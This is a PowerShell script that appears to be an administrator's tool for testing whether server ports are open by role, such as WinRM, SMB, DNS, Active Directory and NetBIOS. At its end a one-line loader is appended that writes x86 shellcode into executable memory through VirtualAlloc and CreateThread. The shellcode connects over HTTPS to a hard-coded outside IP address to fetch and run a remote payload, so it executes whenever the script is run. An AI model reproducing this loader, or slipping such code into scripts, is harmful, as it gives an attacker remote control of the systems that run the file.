

[CmdletBinding()]
[OutputType([System.Management.Automation.PSCustomObject])]
param (
	[Parameter(Mandatory)]
	[ValidateScript({ Test-Connection -ComputerName $_ -Count 1 -Quiet})]
	[string[]]$Computername,
	[Parameter(Mandatory)]
	[ValidateSet('WinRm','Smb','Dns','ActiveDirectoryGeneral','ActiveDirectoryGlobalCatalog','NetBios')]
	[string[]]$ServerRole
)
begin {
	
	function Test-Port {
	
		[CmdletBinding(DefaultParameterSetName = 'TCP')]
		[OutputType([System.Management.Automation.PSCustomObject])]
		param (
			[Parameter(Mandatory)]
			[string[]]$ComputerName,
			[Parameter(Mandatory)]
			[int[]]$Port,
			[Parameter(Mandatory)]
			[ValidateSet('TCP', 'UDP')]
			[string]$Protocol,
			[Parameter(ParameterSetName = 'TCP')]
			[int]$TcpTimeout = 1000,
			[Parameter(ParameterSetName = 'UDP')]
			[int]$UdpTimeout = 1000
		)
		process {
			foreach ($Computer in $ComputerName) {
				foreach ($Portx in $Port) {
					$Output = @{ 'Computername' = $Computer; 'Port' = $Portx; 'Protocol' = $Protocol; 'Result' = '' }
					Write-Verbose "$($MyInvocation.MyCommand.Name) - Beginning port test on '$Computer' on port '$Protocol`:$Portx'"
					if ($Protocol -eq 'TCP') {
						$TcpClient = New-Object System.Net.Sockets.TcpClient
						$Connect = $TcpClient.BeginConnect($Computer, $Portx, $null, $null)
						$Wait = $Connect.AsyncWaitHandle.WaitOne($TcpTimeout, $false)
						if (!$Wait) {
							$TcpClient.Close()
							Write-Verbose "$($MyInvocation.MyCommand.Name) - '$Computer' failed port test on port '$Protocol`:$Portx'"
							$Output.Result = $false
						} else {
							$TcpClient.EndConnect($Connect)
							$TcpClient.Close()
							Write-Verbose "$($MyInvocation.MyCommand.Name) - '$Computer' passed port test on port '$Protocol`:$Portx'"
							$Output.Result = $true
						}
						$TcpClient.Close()
						$TcpClient.Dispose()
					} elseif ($Protocol -eq 'UDP') {
						$UdpClient = New-Object System.Net.Sockets.UdpClient
						$UdpClient.Client.ReceiveTimeout = $UdpTimeout
						$UdpClient.Connect($Computer, $Portx)
						Write-Verbose "$($MyInvocation.MyCommand.Name) - Sending UDP message to computer '$Computer' on port '$Portx'"
						$a = new-object system.text.asciiencoding
						$byte = $a.GetBytes("$(Get-Date)")
						[void]$UdpClient.Send($byte, $byte.length)
						
						Write-Verbose "$($MyInvocation.MyCommand.Name) - Creating remote endpoint"
						$remoteendpoint = New-Object system.net.ipendpoint([system.net.ipaddress]::Any, 0)
						try {
							
							Write-Verbose "$($MyInvocation.MyCommand.Name) - Waiting for message return"
							$receivebytes = $UdpClient.Receive([ref]$remoteendpoint)
							[string]$returndata = $a.GetString($receivebytes)
							If ($returndata) {
								Write-Verbose "$($MyInvocation.MyCommand.Name) - '$Computer' passed port test on port '$Protocol`:$Portx'"
								$Output.Result = $true
							}
						} catch {
							Write-Verbose "$($MyInvocation.MyCommand.Name) - '$Computer' failed port test on port '$Protocol`:$Portx' with error '$($_.Exception.Message)'"
							$Output.Result = $false
						}
						$UdpClient.Close()
						$UdpClient.Dispose()
					}
					[pscustomobject]$Output
				}
			}
		}
	}
	
	$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	
	$PortGroups = @{
		'WinRm' = @{ 'TCP' = 5985}
		'Smb' = @{ 'TCP' = 445; 'UDP' = 445 }
		'Dns' = @{ 'TCP' = 53; 'UDP' = 53 }
		'ActiveDirectoryGeneral' = @{ 'TCP' = 25, 88, 389, 464, 636, 5722, 9389; 'UDP' = 88,123,389,464 }
		'ActiveDirectoryGlobalCatalog' = @{ 'TCP' = 3268, 3269 }
		'NetBios' = @{ 'TCP' = 135, 137, 138, 139; 'UDP' = 137,138,139 }
	}
}
process {
	foreach ($Computer in $Computername) {
		Write-Verbose "Beginning port tests on computer '$Computer'"
		try {
			$TestPortGroups = $PortGroups.GetEnumerator() | where { $ServerRole -contains $_.Key }
			Write-Verbose "Found '$($TestPortGroups.Count)' port group(s) to test"
			foreach ($PortGroup in $TestPortGroups) {
				$PortGroupName = $PortGroup.Key
				$PortGroupValues = $PortGroup.Value
				foreach ($Value in $PortGroupValues.GetEnumerator()) {
					$Protocol = $Value.Key
					$Ports = $Value.Value
					$TestResult = Test-Port -ComputerName $Computer -Protocol $Protocol -Port $Ports
					$TestResult | Add-Member -MemberType 'NoteProperty' -Name 'PortSet' -Value $PortGroupName
					$TestResult
				}
			}
		} catch {
			Write-Verbose "$($MyInvocation.MyCommand.Name) - Computer: $Computer - Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)"
			$false
		}
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0xa7,0x00,0x00,0x00,0x2f,0x4c,0x37,0x6c,0x37,0x46,0x38,0x51,0x73,0x64,0x71,0x4f,0x68,0x6b,0x36,0x43,0x53,0x39,0x32,0x6e,0x6b,0x35,0x41,0x4a,0x58,0x57,0x54,0x6e,0x70,0x6e,0x75,0x4d,0x6e,0x66,0x48,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x4b,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff,0x31,0x33,0x38,0x2e,0x31,0x32,0x38,0x2e,0x31,0x39,0x36,0x2e,0x38,0x34,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

